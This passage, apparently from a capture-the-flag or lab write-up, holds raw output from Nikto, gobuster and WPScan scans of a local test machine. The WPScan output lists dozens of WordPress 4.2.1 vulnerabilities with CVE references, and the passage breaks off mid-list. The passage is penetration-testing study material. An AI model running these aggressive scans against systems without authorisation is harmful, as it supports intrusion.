user agent to protect against some forms of XSS + Uncommon header 'dave' found, with contents: Soemthing doesn't look right here + The site uses SSL and the Strict-Transport-Security HTTP header is not defined. + The site uses SSL and Expect-CT header is not present. + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use '-C all' to force check all possible dirs) + Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + \u0026quot;robots.txt\u0026quot; contains 2 entries which should be manually viewed. + Hostname '192.168.56.101' does not match certificate's names: Red.Initech + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + Uncommon header 'x-ob_mode' found, with contents: 1 + OSVDB-3233: /icons/README: Apache default file found. + /phpmyadmin/: phpMyAdmin directory found + 8071 requests: 0 error(s) and 15 item(s) reported on remote host + End Time: 2020-01-05 21:51:32 (GMT1) (489 seconds) --------------------------------------------------------------------------- + 1 host(s) tested  gobuster ~/go/bin/gobuster dir -u https://192.168.56.101:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt -t 30 -e -k =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: https://192.168.56.101:12380 [+] Threads: 30 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,sql,html,txt [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/01/05 23:07:19 Starting gobuster =============================================================== https://192.168.56.101:12380/index.html (Status: 200) https://192.168.56.101:12380/announcements (Status: 301) https://192.168.56.101:12380/javascript (Status: 301) https://192.168.56.101:12380/robots.txt (Status: 200) https://192.168.56.101:12380/phpmyadmin (Status: 301) https://192.168.56.101:12380/server-status (Status: 403) =============================================================== 2020/01/05 23:19:50 Finished =============================================================== root@kali:~# ~/go/bin/gobuster dir -u https://192.168.56.101:12380/blogblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt -t 30 - -k =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: https://192.168.56.101:12380/blogblog/ [+] Threads: 30 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,sql,html,txt [+] Timeout: 10s =============================================================== 2020/01/05 23:54:22 Starting gobuster =============================================================== /index.php (Status: 301) /wp-content (Status: 301) /wp-login.php (Status: 200) /license.txt (Status: 200) /wp-includes (Status: 301) /readme.html (Status: 200) /wp-trackback.php (Status: 200) /wp-admin (Status: 301) /wp-signup.php (Status: 302) =============================================================== 2020/01/06 00:06:28 Finished ===============================================================  WPScan WPScan full scan wpscan --url https://192.168.56.101:12380/blogblog/ --disable-tls-checks --enumerate ap,at,tt,cb,dbe,u,m --detection-mode aggressive --plugins-detection aggressive --plugins-version-detection aggressive --api-token TOKEN -o full-wpscan _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.7.5 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_ _______________________________________________________________ \u001b[32m[+]\u001b[0m URL: https://192.168.56.101:12380/blogblog/ \u001b[32m[+]\u001b[0m Started: Mon Jan 6 15:24:29 2020 Interesting Finding(s): \u001b[32m[+]\u001b[0m https://192.168.56.101:12380/blogblog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access \u001b[32m[+]\u001b[0m https://192.168.56.101:12380/blogblog/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% \u001b[32m[+]\u001b[0m Registration is enabled: https://192.168.56.101:12380/blogblog/wp-login.php?action=register | Found By: Direct Access (Aggressive Detection) | Confidence: 100% \u001b[32m[+]\u001b[0m Upload directory has listing enabled: https://192.168.56.101:12380/blogblog/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% \u001b[32m[+]\u001b[0m https://192.168.56.101:12380/blogblog/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 \u001b[32m[+]\u001b[0m WordPress version 4.2.1 identified (Insecure, released on 2015-04-27). | Found By: Atom Generator (Aggressive Detection) | - https://192.168.56.101:12380/blogblog/?feed=atom, \u0026lt;generator uri=\u0026quot;http://wordpress.org/\u0026quot; version=\u0026quot;4.2.1\u0026quot;\u0026gt;WordPress\u0026lt;/generator\u0026gt; | Confirmed By: Opml Generator (Aggressive Detection) | - https://192.168.56.101:12380/blogblog/wp-links-opml.php, Match: 'generator=\u0026quot;WordPress/4.2.1\u0026quot;' | | \u001b[31m[!]\u001b[0m 75 vulnerabilities identified: | | \u001b[31m[!]\u001b[0m Title: WordPress 4.1-4.2.1 - Unauthenticated Genericons Cross-Site Scripting (XSS) | Fixed in: 4.2.2 | References: | - https://wpvulndb.com/vulnerabilities/7979 | - https://codex.wordpress.org/Version_4.2.2 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS) | Fixed in: 4.2.3 | References: | - https://wpvulndb.com/vulnerabilities/8111 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623 | - https://wordpress.org/news/2015/07/wordpress-4-2-3/ | - https://twitter.com/klikkioy/status/624264122570526720 | - https://klikki.fi/adv/wordpress3.html | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.2.3 - wp_untrash_post_comments SQL Injection | Fixed in: 4.2.4 | References: | - https://wpvulndb.com/vulnerabilities/8126 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213 | - https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.2.3 - Timing Side Channel Attack | Fixed in: 4.2.4 | References: | - https://wpvulndb.com/vulnerabilities/8130 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730 | - https://core.trac.wordpress.org/changeset/33536 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.2.3 - Widgets Title Cross-Site Scripting (XSS) | Fixed in: 4.2.4 | References: | - https://wpvulndb.com/vulnerabilities/8131 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732 | - https://core.trac.wordpress.org/changeset/33529 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS) | Fixed in: 4.2.4 | References: | - https://wpvulndb.com/vulnerabilities/8132 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733 | - https://core.trac.wordpress.org/changeset/33541 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS) | Fixed in: 4.2.4 | References: | - https://wpvulndb.com/vulnerabilities/8133 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734 | - https://core.trac.wordpress.org/changeset/33549 | - https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS) | Fixed in: 4.2.5 | References: | - https://wpvulndb.com/vulnerabilities/8186 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714 | - https://wordpress.org/news/2015/09/wordpress-4-3-1/ | - http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/ | - http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.3 - User List Table Cross-Site Scripting (XSS) | Fixed in: 4.2.5 | References: | - https://wpvulndb.com/vulnerabilities/8187 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989 | - https://wordpress.org/news/2015/09/wordpress-4-3-1/ | - https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.3 - Publish Post \u0026amp; Mark as Sticky Permission Issue | Fixed in: 4.2.5 | References: | - https://wpvulndb.com/vulnerabilities/8188 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715 | - https://wordpress.org/news/2015/09/wordpress-4-3-1/ | - http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/ | - http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/ | | \u001b[31m[!]\u001b[0m Title: WordPress 3.7-4.4 - Authenticated Cross-Site Scripting (XSS) | Fixed in: 4.2.6 | References: | - https://wpvulndb.com/vulnerabilities/8358 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564 | - https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87 | | \u001b[31m[!]\u001b[0m Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF) | Fixed in: 4.2.7 | References: | - https://wpvulndb.com/vulnerabilities/8376 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222 | - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/36435 | - https://hackerone.com/reports/110801 | | \u001b[31m[!]\u001b[0m Title: WordPress 3.7-4.4.1 - Open Redirect | Fixed in: 4.2.7 | References: | - https://wpvulndb.com/vulnerabilities/8377 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221 | - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/36444 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.4.2 - SSRF Bypass using Octal \u0026amp; Hexedecimal IP addresses | Fixed in: 4.5 | References: | - https://wpvulndb.com/vulnerabilities/8473 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029 | - https://codex.wordpress.org/Version_4.5 | - https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.4.2 - Reflected XSS in Network Settings | Fixed in: 4.5 | References: | - https://wpvulndb.com/vulnerabilities/8474 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634 | - https://codex.wordpress.org/Version_4.5 | - https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.4.2 - Script Compression Option CSRF | Fixed in: 4.5 | References: | - https://wpvulndb.com/vulnerabilities/8475 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635 | - https://codex.wordpress.org/Version_4.5 | | \u001b[31m[!]\u001b[0m Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS) | Fixed in: 4.5.2 | References: | - https://wpvulndb.com/vulnerabilities/8488 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567 | - https://wordpress.org/news/2016/05/wordpress-4-5-2/ | - https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36 | - https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.5.1 - Pupload Same Origin Method Execution (SOME) | Fixed in: 4.2.8 | References: | - https://wpvulndb.com/vulnerabilities/8489 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566 | - https://wordpress.org/news/2016/05/wordpress-4-5-2/ | - https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8 | - https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e | | \u001b[31m[!]\u001b[0m Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS | Fixed in: 4.2.9 | References: | - https://wpvulndb.com/vulnerabilities/8518 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834 | - https://wordpress.org/news/2016/06/wordpress-4-5-3/ | - https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648 | | \u001b[31m[!]\u001b[0m Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure | Fixed in: 4.2.9 | References: | - https://wpvulndb.com/vulnerabilities/8519 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835 | - https://wordpress.org/news/2016/06/wordpress-4-5-3/ | - https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1 | - https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/ | | \u001b[31m[!]\u001b[0m Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post | Fixed in: 4.2.9 | References: | - https://wpvulndb.com/vulnerabilities/8520 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837 | - https://wordpress.org/news/2016/06/wordpress-4-5-3/ | - https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c | | \u001b[31m[!]\u001b[0m Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename | Fixed in: 4.2.10 | References: | - https://wpvulndb.com/vulnerabilities/8615 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168 | - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0 | - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html | - https://seclists.org/fulldisclosure/2016/Sep/6 | | \u001b[31m[!]\u001b[0m Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader | Fixed in: 4.2.10 | References: | - https://wpvulndb.com/vulnerabilities/8616 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169 | - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e | | \u001b[31m[!]\u001b[0m Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php | Fixed in: 4.2.11 | References: | - https://wpvulndb.com/vulnerabilities/8716 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488 | - https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php | - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback | Fixed in: 4.2.11 | References: | - https://wpvulndb.com/vulnerabilities/8718 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490 | - https://www.mehmetince.net/low-severity-wordpress/ | - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.7 - Post via Email Checks mail.example.com by Default | Fixed in: 4.2.11 | References: | - https://wpvulndb.com/vulnerabilities/8719 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491 | - https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a | - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF) | Fixed in: 4.2.11 | References: | - https://wpvulndb.com/vulnerabilities/8720 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492 | - https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733 | - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG) | Fixed in: 4.2.11 | References: | - https://wpvulndb.com/vulnerabilities/8721 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493 | - https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4 | - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress 4.2.0-4.7.1 - Press This UI Available to Unauthorised Users | Fixed in: 4.2.12 | References: | - https://wpvulndb.com/vulnerabilities/8729 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5610 | - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/ | - https://github.com/WordPress/WordPress/commit/21264a31e0849e6ff793a06a17de877dd88ea454 | | \u001b[31m[!]\u001b[0m Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection | Fixed in: 4.2.12 | References: | - https://wpvulndb.com/vulnerabilities/8730 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611 | - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/ | - https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb | | \u001b[31m[!]\u001b[0m Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata | Fixed in: 4.2.13 | References: | - https://wpvulndb.com/vulnerabilities/8765 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814 | - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7 | - https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html | - https://seclists.org/oss-sec/2017/q1/563 | | \u001b[31m[!]\u001b[0m Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation | Fixed in: 4.2.13 | References: | - https://wpvulndb.com/vulnerabilities/8766 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815 | - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e | | \u001b[31m[!]\u001b[0m Title: WordPress 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds | Fixed in: 4.2.13 | References: | - https://wpvulndb.com/vulnerabilities/8768 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817 | - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8 | - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html | | \u001b[31m[!]\u001b[0m Title: WordPress 4.2-4.7.2 - Press This CSRF DoS | Fixed in: 4.2.13 | References: | - https://wpvulndb.com/vulnerabilities/8770 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6819 | - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829 | - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html | - https://seclists.org/oss-sec/2017/q1/562 | - https://hackerone.com/reports/153093 | | \u001b[31m[!]\u001b[0m Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset | References: | - https://wpvulndb.com/vulnerabilities/8807 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295 | - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html | - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html | - https://core.trac.wordpress.org/ticket/25239 | | \u001b[31m[!]\u001b[0m Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation | Fixed in: 4.2.15 | References: | - https://wpvulndb.com/vulnerabilities/8815 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066 | - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | | \u001b[31m[!]\u001b[0m Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC | Fixed in: 4.2.15 | References: | - https://wpvulndb.com/vulnerabilities/8816 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381 | | \u001b[31m[!]\u001b[0m Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks | Fixed in: 4.2.15 | References: | - https://wpvulndb.com/vulnerabilities/8817 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4 | | \u001b[31m[!]\u001b[0m Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF | Fixed in: 4.2.15 | References: | - https://wpvulndb.com/vulnerabilities/8818 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67 | - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html | | \u001b[31m[!]\u001b[0m Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS | Fixed in: 4.2.15 | References: | - https://wpvulndb.com/vulnerabilities/8819 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6 | - https://hackerone.com/reports/203515 | - https://hackerone.com/reports/203515 | | \u001b[31m[!]\u001b[0m Title: WordPress 3.4.0-4.7.4 - Customizer XSS \u0026amp; CSRF | Fixed in: 4.2.15 | References: | - https://wpvulndb.com/vulnerabilities/8820 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3 | | \u001b[31m[!]\u001b[0m Title: WordPress 2.3.0-4.8.1 - $wpdb-\u0026gt;prepare() potential SQL Injection | Fixed in: 4.2.16 | References: | - https://wpvulndb.com/vulnerabilities/8905 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48 | - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec | | \u001b[31m[!]\u001b[0m Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8906 | - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48 | - https://wpvulndb.com/vulnerabilities/8905 | | \u001b[31m[!]\u001b[0m Title: WordPress 2.9.2-4.8.1 - Open Redirect | Fixed in: 4.2.16 | References: | - https://wpvulndb.com/vulnerabilities/8910 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41398 | | \u001b[31m[!]\u001b[0m Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping | Fixed in: 4.2.16 | References: | - https://wpvulndb.com/vulnerabilities/8911 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41457 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.8.2 - $wpdb-\u0026gt;prepare() Weakness | Fixed in: 4.2.17 | References: | - https://wpvulndb.com/vulnerabilities/8941 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510 | - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/ | - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d | - https://twitter.com/ircmaxell/status/923662170092638208 | - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html | | \u001b[31m[!]\u001b[0m Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload | Fixed in: 4.2.18 | References: | - https://wpvulndb.com/vulnerabilities/8966 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509 | | \u001b[31m[!]\u001b[0m Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping | Fixed in: 4.2.18 | References: | - https://wpvulndb.com/vulnerabilities/8967 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de | | \u001b[31m[!]\u001b[0m Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing | Fixed in: 4.2.18 | References: | - https://wpvulndb.com/vulnerabilities/8969 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c | | \u001b[31m[!]\u001b[0m Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS) | Fixed in: 4.9.2 | References: | - https://wpvulndb.com/vulnerabilities/9006 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263 | - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850 | - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/ticket/42720 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.9.4 - Application Denial of Service (DoS) (unpatched) | References: | - https://wpvulndb.com/vulnerabilities/9021 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389 | - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html | - https://github.com/quitten/doser.py | - https://thehackernews.com/2018/02/wordpress-dos-exploit.html | | \u001b[31m[!]\u001b[0m Title: WordPress 3.7-4.9.4 - Remove localhost Default | Fixed in: 4.2.20 | References: | - https://wpvulndb.com/vulnerabilities/9053 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216 | | \u001b[31m[!]\u001b[0m Title: 